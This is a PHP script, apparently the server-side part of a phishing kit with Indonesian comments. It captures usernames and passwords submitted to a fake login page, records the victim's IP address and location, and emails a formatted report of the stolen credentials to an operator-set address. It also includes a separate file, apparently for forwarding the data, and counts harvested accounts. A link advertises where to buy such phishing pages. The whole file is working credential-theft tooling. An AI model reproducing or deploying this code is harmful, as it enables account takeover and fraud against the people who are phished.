<?php
// Created By Dirzz Nesia
// Dilarang Mengganti/Menghapus Copyright
// Hargai Creator
// WhatsApp 6285792116902
// Jangan Ubah Data Dibawah Ini Agar Tidak Error & Bug
include 'system/setting.php';
include 'system/device.php';
date_default_timezone_set("Asia/Jakarta");
$username = $_POST['username'];
$password = $_POST['password'];
$login = $_POST['login'];
$ip = $_SERVER['REMOTE_ADDR'];

// This Sessions One Your Index
$_SESSION['username'] = $username;
$_SESSION['password'] = $password;
$_SESSION['login'] = $login;

// KONTEN RESSULT ACCOUNT 🕊️
$subjek = "$dirz_bendera | $username | Login $login";
$pesan = <<<EOD
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title></title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f9f9f9;
            color: #333;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            min-height: 100vh;
        }

        .result {
            background: #fff;
            box-shadow: 0 4px 8px rgba(0, 0, 0, 0.1);
            border-radius: 10px;
            width: 100%;
            max-width: 800px;
            overflow: hidden;
        }

        .tblResult {
            width: 100%;
            border-collapse: collapse;
        }

        .tblResult th {
            background-color: #007bff;
            color: #fff;
            font-size: 1.2em;
            padding: 15px;
            text-align: center;
        }

        .tblResult td {
            padding: 10px 15px;
            border-bottom: 1px solid #eaeaea;
            text-align: left;
            font-size: 1em;
            color: #555;
        }

        .tblResult tr:hover td {
            background-color: #f1f1f1;
        }

        .tblResult td:first-child {
            font-weight: bold;
        }

        .tblResult td:last-child {
            text-align: center;
            font-style: italic;
            color: #007bff;
        }

        .tblResult th:last-child {
            border-top: 2px solid #0056b3;
        }

        footer {
            background: #007bff;
            color: #fff;
            text-align: center;
            padding: 10px 0;
            font-size: 0.9em;
        }

        @media (max-width: 600px) {
            .tblResult td, .tblResult th {
                font-size: 0.9em;
                padding: 10px;
            }
        }
    </style>
</head>
<body>
    <div class="result">
        <table class="tblResult">
            <tr>
                <th colspan="2">Data $login New</th>
            </tr>
            <tr>
                <td>Email/Nomor</td>
                <td>$username</td>
            </tr>
            <tr>
                <td>Password</td>
                <td>$password</td>
            </tr>
            <tr>
                <td>Login</td>
                <td>$login</td>
            </tr>
            <tr>
                <td>IP Address</td>
                <td>$ip</td>
            </tr>
            	<th colspan="3">Info Location Korban</th>
			</tr>
			<tr>
				<td>Country</td>
					<td>$dirz_negara</td>
			</tr>
		    <tr>
			    <td>Region</td>
					<td>$dirz_daerah</td>
			</tr>
			<tr>
			    <td>City</td>
					<td>$dirz_kota</td>
			</tr>
			<tr>
			    <td>Latitude</td>
					<td>$dirz_lat</td>
			</tr>
			<tr>
			    <td>Longitude</td>
					<td>$dirz_lon</td>
			</tr>
			<tr>
			    <td>Provider</td>
					<td>$dirz_sinyal</td>
			</tr>
                <th colspan="3" style="text-align: center;">
					<a href="https://luky-nesia.my.id/"
                        style="text-decoration: none; 
                        color: #fff; 
                        background: linear-gradient(45deg, #ff00ff, #ff9900, #00ff00, #0099ff); 
                        padding: 0.3em 0.4em; 
                        border-radius: 5px; 
                        border: 2px solid #fff; 
                        margin: 5px auto; 
                        display: inline-block;">
                <b>Tempat Buat Web P Vip</b>
            </a>
        </th>
    </tr>
</table>
</div>
</body>
</html>
EOD;

// Get Today Date
$Tget = file_get_contents("data/visitor.json");
$Tdecode = json_decode($Tget,true);
$today = $Tdecode['today'] + 1;
$Tdecode['today'] = $today;
$Tresult = json_encode($Tdecode);
            $Tfile = fopen('data/visitor.json','w');
                     fwrite($Tfile,$Tresult);
                     fclose($Tfile);
                     
// Yesterday 
if(date("H:i") == "01:00"){
$Yget = file_get_contents("data/visitor.json");
$Ydecode = json_decode($Yget,true);
$Ydecode['yesterday'] = $Ydecode['today'];
$Ydecode['today'] = 0;
$Yresult = json_encode($Ydecode);
            $Yfile = fopen('data/visitor.json','w');
                     fwrite($Yfile,$Yresult);
                     fclose($Yfile);
}

// All Over
$Aget = file_get_contents("data/visitor.json");
$Adecode = json_decode($Aget,true);
$all = $Adecode['total'] + 1;
$Adecode['total'] = $all;
$Aresult = json_encode($Adecode);
            $Afile = fopen('data/visitor.json','w');
                     fwrite($Afile,$Aresult);
                     fclose($Afile);

// Result Data
$resultGet = file_get_contents("data/data.json");
$resultData = json_decode($resultGet,true);

$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= 'From: '.$resultData['nama'].' <admin@dirzznesia.com>' . "\r\n";

if(mail($resultData['email'], $subjek, $pesan, $headers))
include 'filecurl.php';

{
$upGet = file_get_contents("data/data.json");
$upData = json_decode($upGet,true);
$hasil = $upData['totals'] + 1;
$upData['totals'] = $hasil;
$upResult = json_encode($upData);
$upFile = fopen('data/data.json','w');
          fwrite($upFile,$upResult);
          fclose($upFile);
}

?>